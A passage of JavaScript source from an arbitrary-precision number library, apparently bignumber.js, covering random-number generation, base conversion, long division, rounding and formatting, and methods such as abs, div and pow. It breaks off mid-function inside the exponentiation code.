                            // 0x40000000 is 2^30, 0x800000 is 2^23, 0x1fffff is 2^21 - 1.
                            var random53bitInt = (Math.random() * pow2_53) & 0x1fffff ?
                                function() {
                                    return mathfloor(Math.random() * pow2_53);
                                } :
                                function() {
                                    return ((Math.random() * 0x40000000 | 0) * 0x800000) +
                                        (Math.random() * 0x800000 | 0);
                                };

                            return function(dp) {
                                var a, b, e, k, v,
                                    i = 0,
                                    c = [],
                                    rand = new BigNumber(ONE);

                                if (dp == null) dp = DECIMAL_PLACES;
                                else intCheck(dp, 0, MAX);

                                k = mathceil(dp / LOG_BASE);

                                if (CRYPTO) {

                                    // Browsers supporting crypto.getRandomValues.
                                    if (crypto.getRandomValues) {

                                        a = crypto.getRandomValues(new Uint32Array(k *= 2));

                                        for (; i < k;) {

                                            // 53 bits:
                                            // ((Math.pow(2, 32) - 1) * Math.pow(2, 21)).toString(2)
                                            // 11111 11111111 11111111 11111111 11100000 00000000 00000000
                                            // ((Math.pow(2, 32) - 1) >>> 11).toString(2)
                                            //                                     11111 11111111 11111111
                                            // 0x20000 is 2^21.
                                            v = a[i] * 0x20000 + (a[i + 1] >>> 11);

                                            // Rejection sampling:
                                            // 0 <= v < 9007199254740992
                                            // Probability that v >= 9e15, is
                                            // 7199254740992 / 9007199254740992 ~= 0.0008, i.e. 1 in 1251
                                            if (v >= 9e15) {
                                                b = crypto.getRandomValues(new Uint32Array(2));
                                                a[i] = b[0];
                                                a[i + 1] = b[1];
                                            } else {

                                                // 0 <= v <= 8999999999999999
                                                // 0 <= (v % 1e14) <= 99999999999999
                                                c.push(v % 1e14);
                                                i += 2;
                                            }
                                        }
                                        i = k / 2;

                                        // Node.js supporting crypto.randomBytes.
                                    } else if (crypto.randomBytes) {

                                        // buffer
                                        a = crypto.randomBytes(k *= 7);

                                        for (; i < k;) {

                                            // 0x1000000000000 is 2^48, 0x10000000000 is 2^40
                                            // 0x100000000 is 2^32, 0x1000000 is 2^24
                                            // 11111 11111111 11111111 11111111 11111111 11111111 11111111
                                            // 0 <= v < 9007199254740992
                                            v = ((a[i] & 31) * 0x1000000000000) + (a[i + 1] * 0x10000000000) +
                                                (a[i + 2] * 0x100000000) + (a[i + 3] * 0x1000000) +
                                                (a[i + 4] << 16) + (a[i + 5] << 8) + a[i + 6];

                                            if (v >= 9e15) {
                                                crypto.randomBytes(7).copy(a, i);
                                            } else {

                                                // 0 <= (v % 1e14) <= 99999999999999
                                                c.push(v % 1e14);
                                                i += 7;
                                            }
                                        }
                                        i = k / 7;
                                    } else {
                                        CRYPTO = false;
                                        throw Error(bignumberError + 'crypto unavailable');
                                    }
                                }

                                // Use Math.random.
                                if (!CRYPTO) {

                                    for (; i < k;) {
                                        v = random53bitInt();
                                        if (v < 9e15) c[i++] = v % 1e14;
                                    }
                                }

                                k = c[--i];
                                dp %= LOG_BASE;

                                // Convert trailing digits to zeros according to dp.
                                if (k && dp) {
                                    v = POWS_TEN[LOG_BASE - dp];
                                    c[i] = mathfloor(k / v) * v;
                                }

                                // Remove trailing elements which are zero.
                                for (; c[i] === 0; c.pop(), i--);

                                // Zero?
                                if (i < 0) {
                                    c = [e = 0];
                                } else {

                                    // Remove leading elements which are zero and adjust exponent accordingly.
                                    for (e = -1; c[0] === 0; c.splice(0, 1), e -= LOG_BASE);

                                    // Count the digits of the first element of c to determine leading zeros, and...
                                    for (i = 1, v = c[0]; v >= 10; v /= 10, i++);

                                    // adjust the exponent accordingly.
                                    if (i < LOG_BASE) e -= LOG_BASE - i;
                                }

                                rand.e = e;
                                rand.c = c;
                                return rand;
                            };
                        })();


                        /*
                         * Return a BigNumber whose value is the sum of the arguments.
                         *
                         * arguments {number|string|BigNumber}
                         */
                        BigNumber.sum = function() {
                            var i = 1,
                                args = arguments,
                                sum = new BigNumber(args[0]);
                            for (; i < args.length;) sum = sum.plus(args[i++]);
                            return sum;
                        };


                        // PRIVATE FUNCTIONS


                        // Called by BigNumber and BigNumber.prototype.toString.
                        convertBase = (function() {
                            var decimal = '0123456789';

                            /*
                             * Convert string of baseIn to an array of numbers of baseOut.
                             * Eg. toBaseOut('255', 10, 16) returns [15, 15].
                             * Eg. toBaseOut('ff', 16, 10) returns [2, 5, 5].
                             */
                            function toBaseOut(str, baseIn, baseOut, alphabet) {
                                var j,
                                    arr = [0],
                                    arrL,
                                    i = 0,
                                    len = str.length;

                                for (; i < len;) {
                                    for (arrL = arr.length; arrL--; arr[arrL] *= baseIn);

                                    arr[0] += alphabet.indexOf(str.charAt(i++));

                                    for (j = 0; j < arr.length; j++) {

                                        if (arr[j] > baseOut - 1) {
                                            if (arr[j + 1] == null) arr[j + 1] = 0;
                                            arr[j + 1] += arr[j] / baseOut | 0;
                                            arr[j] %= baseOut;
                                        }
                                    }
                                }

                                return arr.reverse();
                            }

                            // Convert a numeric string of baseIn to a numeric string of baseOut.
                            // If the caller is toString, we are converting from base 10 to baseOut.
                            // If the caller is BigNumber, we are converting from baseIn to base 10.
                            return function(str, baseIn, baseOut, sign, callerIsToString) {
                                var alphabet, d, e, k, r, x, xc, y,
                                    i = str.indexOf('.'),
                                    dp = DECIMAL_PLACES,
                                    rm = ROUNDING_MODE;

                                // Non-integer.
                                if (i >= 0) {
                                    k = POW_PRECISION;

                                    // Unlimited precision.
                                    POW_PRECISION = 0;
                                    str = str.replace('.', '');
                                    y = new BigNumber(baseIn);
                                    x = y.pow(str.length - i);
                                    POW_PRECISION = k;

                                    // Convert str as if an integer, then restore the fraction part by dividing the
                                    // result by its base raised to a power.

                                    y.c = toBaseOut(toFixedPoint(coeffToString(x.c), x.e, '0'),
                                        10, baseOut, decimal);
                                    y.e = y.c.length;
                                }

                                // Convert the number as integer.

                                xc = toBaseOut(str, baseIn, baseOut, callerIsToString ?
                                    (alphabet = ALPHABET, decimal) :
                                    (alphabet = decimal, ALPHABET));

                                // xc now represents str as an integer and converted to baseOut. e is the exponent.
                                e = k = xc.length;

                                // Remove trailing zeros.
                                for (; xc[--k] == 0; xc.pop());

                                // Zero?
                                if (!xc[0]) return alphabet.charAt(0);

                                // Does str represent an integer? If so, no need for the division.
                                if (i < 0) {
                                    --e;
                                } else {
                                    x.c = xc;
                                    x.e = e;

                                    // The sign is needed for correct rounding.
                                    x.s = sign;
                                    x = div(x, y, dp, rm, baseOut);
                                    xc = x.c;
                                    r = x.r;
                                    e = x.e;
                                }

                                // xc now represents str converted to baseOut.

                                // THe index of the rounding digit.
                                d = e + dp + 1;

                                // The rounding digit: the digit to the right of the digit that may be rounded up.
                                i = xc[d];

                                // Look at the rounding digits and mode to determine whether to round up.

                                k = baseOut / 2;
                                r = r || d < 0 || xc[d + 1] != null;

                                r = rm < 4 ? (i != null || r) && (rm == 0 || rm == (x.s < 0 ? 3 : 2)) :
                                    i > k || i == k && (rm == 4 || r || rm == 6 && xc[d - 1] & 1 ||
                                        rm == (x.s < 0 ? 8 : 7));

                                // If the index of the rounding digit is not greater than zero, or xc represents
                                // zero, then the result of the base conversion is zero or, if rounding up, a value
                                // such as 0.00001.
                                if (d < 1 || !xc[0]) {

                                    // 1^-dp or 0
                                    str = r ? toFixedPoint(alphabet.charAt(1), -dp, alphabet.charAt(0)) : alphabet.charAt(0);
                                } else {

                                    // Truncate xc to the required number of decimal places.
                                    xc.length = d;

                                    // Round up?
                                    if (r) {

                                        // Rounding up may mean the previous digit has to be rounded up and so on.
                                        for (--baseOut; ++xc[--d] > baseOut;) {
                                            xc[d] = 0;

                                            if (!d) {
                                                ++e;
                                                xc = [1].concat(xc);
                                            }
                                        }
                                    }

                                    // Determine trailing zeros.
                                    for (k = xc.length; !xc[--k];);

                                    // E.g. [4, 11, 15] becomes 4bf.
                                    for (i = 0, str = ''; i <= k; str += alphabet.charAt(xc[i++]));

                                    // Add leading zeros, decimal point and trailing zeros as required.
                                    str = toFixedPoint(str, e, alphabet.charAt(0));
                                }

                                // The caller will add the sign.
                                return str;
                            };
                        })();


                        // Perform division in the specified base. Called by div and convertBase.
                        div = (function() {

                            // Assume non-zero x and k.
                            function multiply(x, k, base) {
                                var m, temp, xlo, xhi,
                                    carry = 0,
                                    i = x.length,
                                    klo = k % SQRT_BASE,
                                    khi = k / SQRT_BASE | 0;

                                for (x = x.slice(); i--;) {
                                    xlo = x[i] % SQRT_BASE;
                                    xhi = x[i] / SQRT_BASE | 0;
                                    m = khi * xlo + xhi * klo;
                                    temp = klo * xlo + ((m % SQRT_BASE) * SQRT_BASE) + carry;
                                    carry = (temp / base | 0) + (m / SQRT_BASE | 0) + khi * xhi;
                                    x[i] = temp % base;
                                }

                                if (carry) x = [carry].concat(x);

                                return x;
                            }

                            function compare(a, b, aL, bL) {
                                var i, cmp;

                                if (aL != bL) {
                                    cmp = aL > bL ? 1 : -1;
                                } else {

                                    for (i = cmp = 0; i < aL; i++) {

                                        if (a[i] != b[i]) {
                                            cmp = a[i] > b[i] ? 1 : -1;
                                            break;
                                        }
                                    }
                                }

                                return cmp;
                            }

                            function subtract(a, b, aL, base) {
                                var i = 0;

                                // Subtract b from a.
                                for (; aL--;) {
                                    a[aL] -= i;
                                    i = a[aL] < b[aL] ? 1 : 0;
                                    a[aL] = i * base + a[aL] - b[aL];
                                }

                                // Remove leading zeros.
                                for (; !a[0] && a.length > 1; a.splice(0, 1));
                            }

                            // x: dividend, y: divisor.
                            return function(x, y, dp, rm, base) {
                                var cmp, e, i, more, n, prod, prodL, q, qc, rem, remL, rem0, xi, xL, yc0,
                                    yL, yz,
                                    s = x.s == y.s ? 1 : -1,
                                    xc = x.c,
                                    yc = y.c;

                                // Either NaN, Infinity or 0?
                                if (!xc || !xc[0] || !yc || !yc[0]) {

                                    return new BigNumber(

                                        // Return NaN if either NaN, or both Infinity or 0.
                                        !x.s || !y.s || (xc ? yc && xc[0] == yc[0] : !yc) ? NaN :

                                        // Return ±0 if x is ±0 or y is ±Infinity, or return ±Infinity as y is ±0.
                                        xc && xc[0] == 0 || !yc ? s * 0 : s / 0
                                    );
                                }

                                q = new BigNumber(s);
                                qc = q.c = [];
                                e = x.e - y.e;
                                s = dp + e + 1;

                                if (!base) {
                                    base = BASE;
                                    e = bitFloor(x.e / LOG_BASE) - bitFloor(y.e / LOG_BASE);
                                    s = s / LOG_BASE | 0;
                                }

                                // Result exponent may be one less then the current value of e.
                                // The coefficients of the BigNumbers from convertBase may have trailing zeros.
                                for (i = 0; yc[i] == (xc[i] || 0); i++);

                                if (yc[i] > (xc[i] || 0)) e--;

                                if (s < 0) {
                                    qc.push(1);
                                    more = true;
                                } else {
                                    xL = xc.length;
                                    yL = yc.length;
                                    i = 0;
                                    s += 2;

                                    // Normalise xc and yc so highest order digit of yc is >= base / 2.

                                    n = mathfloor(base / (yc[0] + 1));

                                    // Not necessary, but to handle odd bases where yc[0] == (base / 2) - 1.
                                    // if (n > 1 || n++ == 1 && yc[0] < base / 2) {
                                    if (n > 1) {
                                        yc = multiply(yc, n, base);
                                        xc = multiply(xc, n, base);
                                        yL = yc.length;
                                        xL = xc.length;
                                    }

                                    xi = yL;
                                    rem = xc.slice(0, yL);
                                    remL = rem.length;

                                    // Add zeros to make remainder as long as divisor.
                                    for (; remL < yL; rem[remL++] = 0);
                                    yz = yc.slice();
                                    yz = [0].concat(yz);
                                    yc0 = yc[0];
                                    if (yc[1] >= base / 2) yc0++;
                                    // Not necessary, but to prevent trial digit n > base, when using base 3.
                                    // else if (base == 3 && yc0 == 1) yc0 = 1 + 1e-15;

                                    do {
                                        n = 0;

                                        // Compare divisor and remainder.
                                        cmp = compare(yc, rem, yL, remL);

                                        // If divisor < remainder.
                                        if (cmp < 0) {

                                            // Calculate trial digit, n.

                                            rem0 = rem[0];
                                            if (yL != remL) rem0 = rem0 * base + (rem[1] || 0);

                                            // n is how many times the divisor goes into the current remainder.
                                            n = mathfloor(rem0 / yc0);

                                            //  Algorithm:
                                            //  product = divisor multiplied by trial digit (n).
                                            //  Compare product and remainder.
                                            //  If product is greater than remainder:
                                            //    Subtract divisor from product, decrement trial digit.
                                            //  Subtract product from remainder.
                                            //  If product was less than remainder at the last compare:
                                            //    Compare new remainder and divisor.
                                            //    If remainder is greater than divisor:
                                            //      Subtract divisor from remainder, increment trial digit.

                                            if (n > 1) {

                                                // n may be > base only when base is 3.
                                                if (n >= base) n = base - 1;

                                                // product = divisor * trial digit.
                                                prod = multiply(yc, n, base);
                                                prodL = prod.length;
                                                remL = rem.length;

                                                // Compare product and remainder.
                                                // If product > remainder then trial digit n too high.
                                                // n is 1 too high about 5% of the time, and is not known to have
                                                // ever been more than 1 too high.
                                                while (compare(prod, rem, prodL, remL) == 1) {
                                                    n--;

                                                    // Subtract divisor from product.
                                                    subtract(prod, yL < prodL ? yz : yc, prodL, base);
                                                    prodL = prod.length;
                                                    cmp = 1;
                                                }
                                            } else {

                                                // n is 0 or 1, cmp is -1.
                                                // If n is 0, there is no need to compare yc and rem again below,
                                                // so change cmp to 1 to avoid it.
                                                // If n is 1, leave cmp as -1, so yc and rem are compared again.
                                                if (n == 0) {

                                                    // divisor < remainder, so n must be at least 1.
                                                    cmp = n = 1;
                                                }

                                                // product = divisor
                                                prod = yc.slice();
                                                prodL = prod.length;
                                            }

                                            if (prodL < remL) prod = [0].concat(prod);

                                            // Subtract product from remainder.
                                            subtract(rem, prod, remL, base);
                                            remL = rem.length;

                                            // If product was < remainder.
                                            if (cmp == -1) {

                                                // Compare divisor and new remainder.
                                                // If divisor < new remainder, subtract divisor from remainder.
                                                // Trial digit n too low.
                                                // n is 1 too low about 5% of the time, and very rarely 2 too low.
                                                while (compare(yc, rem, yL, remL) < 1) {
                                                    n++;

                                                    // Subtract divisor from remainder.
                                                    subtract(rem, yL < remL ? yz : yc, remL, base);
                                                    remL = rem.length;
                                                }
                                            }
                                        } else if (cmp === 0) {
                                            n++;
                                            rem = [0];
                                        } // else cmp === 1 and n will be 0

                                        // Add the next digit, n, to the result array.
                                        qc[i++] = n;

                                        // Update the remainder.
                                        if (rem[0]) {
                                            rem[remL++] = xc[xi] || 0;
                                        } else {
                                            rem = [xc[xi]];
                                            remL = 1;
                                        }
                                    } while ((xi++ < xL || rem[0] != null) && s--);

                                    more = rem[0] != null;

                                    // Leading zero?
                                    if (!qc[0]) qc.splice(0, 1);
                                }

                                if (base == BASE) {

                                    // To calculate q.e, first get the number of digits of qc[0].
                                    for (i = 1, s = qc[0]; s >= 10; s /= 10, i++);

                                    round(q, dp + (q.e = i + e * LOG_BASE - 1) + 1, rm, more);

                                    // Caller is convertBase.
                                } else {
                                    q.e = e;
                                    q.r = +more;
                                }

                                return q;
                            };
                        })();


                        /*
                         * Return a string representing the value of BigNumber n in fixed-point or exponential
                         * notation rounded to the specified decimal places or significant digits.
                         *
                         * n: a BigNumber.
                         * i: the index of the last digit required (i.e. the digit that may be rounded up).
                         * rm: the rounding mode.
                         * id: 1 (toExponential) or 2 (toPrecision).
                         */
                        function format(n, i, rm, id) {
                            var c0, e, ne, len, str;

                            if (rm == null) rm = ROUNDING_MODE;
                            else intCheck(rm, 0, 8);

                            if (!n.c) return n.toString();

                            c0 = n.c[0];
                            ne = n.e;

                            if (i == null) {
                                str = coeffToString(n.c);
                                str = id == 1 || id == 2 && (ne <= TO_EXP_NEG || ne >= TO_EXP_POS) ?
                                    toExponential(str, ne) :
                                    toFixedPoint(str, ne, '0');
                            } else {
                                n = round(new BigNumber(n), i, rm);

                                // n.e may have changed if the value was rounded up.
                                e = n.e;

                                str = coeffToString(n.c);
                                len = str.length;

                                // toPrecision returns exponential notation if the number of significant digits
                                // specified is less than the number of digits necessary to represent the integer
                                // part of the value in fixed-point notation.

                                // Exponential notation.
                                if (id == 1 || id == 2 && (i <= e || e <= TO_EXP_NEG)) {

                                    // Append zeros?
                                    for (; len < i; str += '0', len++);
                                    str = toExponential(str, e);

                                    // Fixed-point notation.
                                } else {
                                    i -= ne;
                                    str = toFixedPoint(str, e, '0');

                                    // Append zeros?
                                    if (e + 1 > len) {
                                        if (--i > 0)
                                            for (str += '.'; i--; str += '0');
                                    } else {
                                        i += e - len;
                                        if (i > 0) {
                                            if (e + 1 == len) str += '.';
                                            for (; i--; str += '0');
                                        }
                                    }
                                }
                            }

                            return n.s < 0 && c0 ? '-' + str : str;
                        }


                        // Handle BigNumber.max and BigNumber.min.
                        function maxOrMin(args, method) {
                            var n,
                                i = 1,
                                m = new BigNumber(args[0]);

                            for (; i < args.length; i++) {
                                n = new BigNumber(args[i]);

                                // If any number is NaN, return NaN.
                                if (!n.s) {
                                    m = n;
                                    break;
                                } else if (method.call(m, n)) {
                                    m = n;
                                }
                            }

                            return m;
                        }


                        /*
                         * Strip trailing zeros, calculate base 10 exponent and check against MIN_EXP and MAX_EXP.
                         * Called by minus, plus and times.
                         */
                        function normalise(n, c, e) {
                            var i = 1,
                                j = c.length;

                            // Remove trailing zeros.
                            for (; !c[--j]; c.pop());

                            // Calculate the base 10 exponent. First get the number of digits of c[0].
                            for (j = c[0]; j >= 10; j /= 10, i++);

                            // Overflow?
                            if ((e = i + e * LOG_BASE - 1) > MAX_EXP) {

                                // Infinity.
                                n.c = n.e = null;

                                // Underflow?
                            } else if (e < MIN_EXP) {

                                // Zero.
                                n.c = [n.e = 0];
                            } else {
                                n.e = e;
                                n.c = c;
                            }

                            return n;
                        }


                        // Handle values that fail the validity test in BigNumber.
                        parseNumeric = (function() {
                            var basePrefix = /^(-?)0([xbo])(?=\w[\w.]*$)/i,
                                dotAfter = /^([^.]+)\.$/,
                                dotBefore = /^\.([^.]+)$/,
                                isInfinityOrNaN = /^-?(Infinity|NaN)$/,
                                whitespaceOrPlus = /^\s*\+(?=[\w.])|^\s+|\s+$/g;

                            return function(x, str, isNum, b) {
                                var base,
                                    s = isNum ? str : str.replace(whitespaceOrPlus, '');

                                // No exception on ±Infinity or NaN.
                                if (isInfinityOrNaN.test(s)) {
                                    x.s = isNaN(s) ? null : s < 0 ? -1 : 1;
                                } else {
                                    if (!isNum) {

                                        // basePrefix = /^(-?)0([xbo])(?=\w[\w.]*$)/i
                                        s = s.replace(basePrefix, function(m, p1, p2) {
                                            base = (p2 = p2.toLowerCase()) == 'x' ? 16 : p2 == 'b' ? 2 : 8;
                                            return !b || b == base ? p1 : m;
                                        });

                                        if (b) {
                                            base = b;

                                            // E.g. '1.' to '1', '.1' to '0.1'
                                            s = s.replace(dotAfter, '$1').replace(dotBefore, '0.$1');
                                        }

                                        if (str != s) return new BigNumber(s, base);
                                    }

                                    // '[BigNumber Error] Not a number: {n}'
                                    // '[BigNumber Error] Not a base {b} number: {n}'
                                    if (BigNumber.DEBUG) {
                                        throw Error(bignumberError + 'Not a' + (b ? ' base ' + b : '') + ' number: ' + str);
                                    }

                                    // NaN
                                    x.s = null;
                                }

                                x.c = x.e = null;
                            }
                        })();


                        /*
                         * Round x to sd significant digits using rounding mode rm. Check for over/under-flow.
                         * If r is truthy, it is known that there are more digits after the rounding digit.
                         */
                        function round(x, sd, rm, r) {
                            var d, i, j, k, n, ni, rd,
                                xc = x.c,
                                pows10 = POWS_TEN;

                            // if x is not Infinity or NaN...
                            if (xc) {

                                // rd is the rounding digit, i.e. the digit after the digit that may be rounded up.
                                // n is a base 1e14 number, the value of the element of array x.c containing rd.
                                // ni is the index of n within x.c.
                                // d is the number of digits of n.
                                // i is the index of rd within n including leading zeros.
                                // j is the actual index of rd within n (if < 0, rd is a leading zero).
                                out: {

                                    // Get the number of digits of the first element of xc.
                                    for (d = 1, k = xc[0]; k >= 10; k /= 10, d++);
                                    i = sd - d;

                                    // If the rounding digit is in the first element of xc...
                                    if (i < 0) {
                                        i += LOG_BASE;
                                        j = sd;
                                        n = xc[ni = 0];

                                        // Get the rounding digit at index j of n.
                                        rd = n / pows10[d - j - 1] % 10 | 0;
                                    } else {
                                        ni = mathceil((i + 1) / LOG_BASE);

                                        if (ni >= xc.length) {

                                            if (r) {

                                                // Needed by sqrt.
                                                for (; xc.length <= ni; xc.push(0));
                                                n = rd = 0;
                                                d = 1;
                                                i %= LOG_BASE;
                                                j = i - LOG_BASE + 1;
                                            } else {
                                                break out;
                                            }
                                        } else {
                                            n = k = xc[ni];

                                            // Get the number of digits of n.
                                            for (d = 1; k >= 10; k /= 10, d++);

                                            // Get the index of rd within n.
                                            i %= LOG_BASE;

                                            // Get the index of rd within n, adjusted for leading zeros.
                                            // The number of leading zeros of n is given by LOG_BASE - d.
                                            j = i - LOG_BASE + d;

                                            // Get the rounding digit at index j of n.
                                            rd = j < 0 ? 0 : n / pows10[d - j - 1] % 10 | 0;
                                        }
                                    }

                                    r = r || sd < 0 ||

                                    // Are there any non-zero digits after the rounding digit?
                                    // The expression  n % pows10[d - j - 1]  returns all digits of n to the right
                                    // of the digit at j, e.g. if n is 908714 and j is 2, the expression gives 714.
                                    xc[ni + 1] != null || (j < 0 ? n : n % pows10[d - j - 1]);

                                    r = rm < 4 ?
                                    (rd || r) && (rm == 0 || rm == (x.s < 0 ? 3 : 2)) : rd > 5 || rd == 5 && (rm == 4 || r || rm == 6 &&

                                        // Check whether the digit to the left of the rounding digit is odd.
                                        ((i > 0 ? j > 0 ? n / pows10[d - j] : 0 : xc[ni - 1]) % 10) & 1 ||
                                        rm == (x.s < 0 ? 8 : 7));

                                    if (sd < 1 || !xc[0]) {
                                        xc.length = 0;

                                        if (r) {

                                            // Convert sd to decimal places.
                                            sd -= x.e + 1;

                                            // 1, 0.1, 0.01, 0.001, 0.0001 etc.
                                            xc[0] = pows10[(LOG_BASE - sd % LOG_BASE) % LOG_BASE];
                                            x.e = -sd || 0;
                                        } else {

                                            // Zero.
                                            xc[0] = x.e = 0;
                                        }

                                        return x;
                                    }

                                    // Remove excess digits.
                                    if (i == 0) {
                                        xc.length = ni;
                                        k = 1;
                                        ni--;
                                    } else {
                                        xc.length = ni + 1;
                                        k = pows10[LOG_BASE - i];

                                        // E.g. 56700 becomes 56000 if 7 is the rounding digit.
                                        // j > 0 means i > number of leading zeros of n.
                                        xc[ni] = j > 0 ? mathfloor(n / pows10[d - j] % pows10[j]) * k : 0;
                                    }

                                    // Round up?
                                    if (r) {

                                        for (;;) {

                                            // If the digit to be rounded up is in the first element of xc...
                                            if (ni == 0) {

                                                // i will be the length of xc[0] before k is added.
                                                for (i = 1, j = xc[0]; j >= 10; j /= 10, i++);
                                                j = xc[0] += k;
                                                for (k = 1; j >= 10; j /= 10, k++);

                                                // if i != k the length has increased.
                                                if (i != k) {
                                                    x.e++;
                                                    if (xc[0] == BASE) xc[0] = 1;
                                                }

                                                break;
                                            } else {
                                                xc[ni] += k;
                                                if (xc[ni] != BASE) break;
                                                xc[ni--] = 0;
                                                k = 1;
                                            }
                                        }
                                    }

                                    // Remove trailing zeros.
                                    for (i = xc.length; xc[--i] === 0; xc.pop());
                                }

                                // Overflow? Infinity.
                                if (x.e > MAX_EXP) {
                                    x.c = x.e = null;

                                    // Underflow? Zero.
                                } else if (x.e < MIN_EXP) {
                                    x.c = [x.e = 0];
                                }
                            }

                            return x;
                        }


                        function valueOf(n) {
                            var str,
                                e = n.e;

                            if (e === null) return n.toString();

                            str = coeffToString(n.c);

                            str = e <= TO_EXP_NEG || e >= TO_EXP_POS ?
                                toExponential(str, e) :
                                toFixedPoint(str, e, '0');

                            return n.s < 0 ? '-' + str : str;
                        }


                        // PROTOTYPE/INSTANCE METHODS


                        /*
                         * Return a new BigNumber whose value is the absolute value of this BigNumber.
                         */
                        P.absoluteValue = P.abs = function() {
                            var x = new BigNumber(this);
                            if (x.s < 0) x.s = 1;
                            return x;
                        };


                        /*
                         * Return
                         *   1 if the value of this BigNumber is greater than the value of BigNumber(y, b),
                         *   -1 if the value of this BigNumber is less than the value of BigNumber(y, b),
                         *   0 if they have the same value,
                         *   or null if the value of either is NaN.
                         */
                        P.comparedTo = function(y, b) {
                            return compare(this, new BigNumber(y, b));
                        };


                        /*
                         * If dp is undefined or null or true or false, return the number of decimal places of the
                         * value of this BigNumber, or null if the value of this BigNumber is ±Infinity or NaN.
                         *
                         * Otherwise, if dp is a number, return a new BigNumber whose value is the value of this
                         * BigNumber rounded to a maximum of dp decimal places using rounding mode rm, or
                         * ROUNDING_MODE if rm is omitted.
                         *
                         * [dp] {number} Decimal places: integer, 0 to MAX inclusive.
                         * [rm] {number} Rounding mode. Integer, 0 to 8 inclusive.
                         *
                         * '[BigNumber Error] Argument {not a primitive number|not an integer|out of range}: {dp|rm}'
                         */
                        P.decimalPlaces = P.dp = function(dp, rm) {
                            var c, n, v,
                                x = this;

                            if (dp != null) {
                                intCheck(dp, 0, MAX);
                                if (rm == null) rm = ROUNDING_MODE;
                                else intCheck(rm, 0, 8);

                                return round(new BigNumber(x), dp + x.e + 1, rm);
                            }

                            if (!(c = x.c)) return null;
                            n = ((v = c.length - 1) - bitFloor(this.e / LOG_BASE)) * LOG_BASE;

                            // Subtract the number of trailing zeros of the last number.
                            if (v = c[v])
                                for (; v % 10 == 0; v /= 10, n--);
                            if (n < 0) n = 0;

                            return n;
                        };


                        /*
                         *  n / 0 = I
                         *  n / N = N
                         *  n / I = 0
                         *  0 / n = 0
                         *  0 / 0 = N
                         *  0 / N = N
                         *  0 / I = 0
                         *  N / n = N
                         *  N / 0 = N
                         *  N / N = N
                         *  N / I = N
                         *  I / n = I
                         *  I / 0 = I
                         *  I / N = N
                         *  I / I = N
                         *
                         * Return a new BigNumber whose value is the value of this BigNumber divided by the value of
                         * BigNumber(y, b), rounded according to DECIMAL_PLACES and ROUNDING_MODE.
                         */
                        P.dividedBy = P.div = function(y, b) {
                            return div(this, new BigNumber(y, b), DECIMAL_PLACES, ROUNDING_MODE);
                        };


                        /*
                         * Return a new BigNumber whose value is the integer part of dividing the value of this
                         * BigNumber by the value of BigNumber(y, b).
                         */
                        P.dividedToIntegerBy = P.idiv = function(y, b) {
                            return div(this, new BigNumber(y, b), 0, 1);
                        };


                        /*
                         * Return a BigNumber whose value is the value of this BigNumber exponentiated by n.
                         *
                         * If m is present, return the result modulo m.
                         * If n is negative round according to DECIMAL_PLACES and ROUNDING_MODE.
                         * If POW_PRECISION is non-zero and m is not present, round to POW_PRECISION using ROUNDING_MODE.
                         *
                         * The modular power operation works efficiently when x, n, and m are integers, otherwise it
                         * is equivalent to calculating x.exponentiatedBy(n).modulo(m) with a POW_PRECISION of 0.
                         *
                         * n {number|string|BigNumber} The exponent. An integer.
                         * [m] {number|string|BigNumber} The modulus.
                         *
                         * '[BigNumber Error] Exponent not an integer: {n}'
                         */
                        P.exponentiatedBy = P.pow = function(n, m) {
                            var half, isModExp, i, k, more, nIsBig, nIsNeg, nIsOdd, y,
                                x = this;

                            n = new BigNumber(n);

                            // Allow NaN and ±Infinity, but not other non-integers.
                            if (n.c && !n.isInteger()) {
                                throw Error(bignumberError + 'Exponent not an integer: ' + valueOf(n));
                            }

                            if (m != null) m = new BigNumber(m);

                            // Exponent of MAX_SAFE_INTEGER is 15.
                            nIsBig = n.e > 14;

                            // If x is NaN, ±Infinity, ±0 or ±1, or n is ±Infinity, NaN or ±0.
                            if (!x.c || !x.c[0] || x.c[0] == 1 && !x.e && x.c.length == 1 || !n.c || !n.c[0]) {

                                // The sign of the result of pow when x is negative depends on the evenness of n.
                                // If +n overflows to ±Infinity, the evenness of n would be not be known.
                                y = new BigNumber(Math.pow(+valueOf(x), nIsBig ? 2 - isOdd(n) : +valueOf(n)));
                                return m ? y.mod(m) : y;
                            }

                            nIsNeg = n.s < 0;

                            if (m) {

                                // x % m returns NaN if abs(m) is zero, or m is NaN.
                                if (m.c ? !m.c[0] : !m.s) return new BigNumber(NaN);

                                isModExp = !nIsNeg && x.isInteger() && m.isInteger();

                                if (isModExp) x = x.mod(m);

                                // Overflow to ±Infinity: >=2**1e10 or >=1.0000024**1e15.
                                // Underflow to ±0: <=0.79**1e10 or <=0.9999975**1e15.
                            } else if (n.e > 9 && (x.e > 0 || x.e < -1 || (x.e == 0
                                    // [1, 240000000]
                                    ?
                                    x.c[0] > 1 || nIsBig && x.c[1] >= 24e7
                                    // [80000000000000]  [99999750000000]
                                    :
                                    x.c[0] < 8e13 || nIsBig && x.c[0] <= 9999975e7))) {

                                // If x is negative and n is odd, k = -0, else k = 0.
                                k = x.s < 0 && isOdd(n) ? -0 : 0;

                                // If x >= 1, k = ±Infinity.
                                if (x.e > -1) k = 1 / k;

                                // If n is negative return ±0, else return ±Infinity.
                                return new BigNumber(nIsNeg ? 1 / k : k);

                            } else if (POW_PRECISION) {

                                // Truncating each coefficient array to a length of k after each multiplication
                                // equates to truncating significant digits to POW_PRECISION + [28, 41],
                                // i.e. there will be a minimum of 28 guard digits retained.
                                k = mathceil(POW_PRECISION / LOG_BASE + 2);
                            }

                            if (nIsBig) {
                                half = new BigNumber(0.5);
                                if (nIsNeg) n.s = 1;
                                nIsOdd = isOdd(n);
                            } else {
                                i = Math.abs(+valueOf(n));
                                nIsOdd = i % 2;
                            }

                            y = new BigNumber(ONE);

                            // Performs 54 loop iterations for n of 9007199254740991.
                            for (;;) {

                                if (nIsOdd) {
                                    y = y.times(x);
                                    if (!y.c) break;

                                    if (k) {
                                        if (y.c.length > k) y.c.length = k;
                                    } else if (isModExp) {
                                        y = y.mod(m); //y = y.minus(div(y, m, 0, MODULO_MODE).times(m));
                                    }
                                }

                                if (i) {
                                    i = mathfloor(i / 2);
                                    if (i === 0) break;
                                    nIsOdd = i % 2;
                                } else {
                                    n = n.times(half);
                                    round(n, n.e + 1, 1);

                                    if (n.e > 14) {
                                        nIsOdd = isOdd(n);
                                    } else {
                                        i = +valueOf(n);
                                        if (i === 0) break;
                                        nIsOdd = i % 2;
                                    }
                                }

                                x = x.times(x);

                                if (k) {
                                    if (x.c && x.c.length > k) x.c.length = k;
                                } else if (isModExp) {
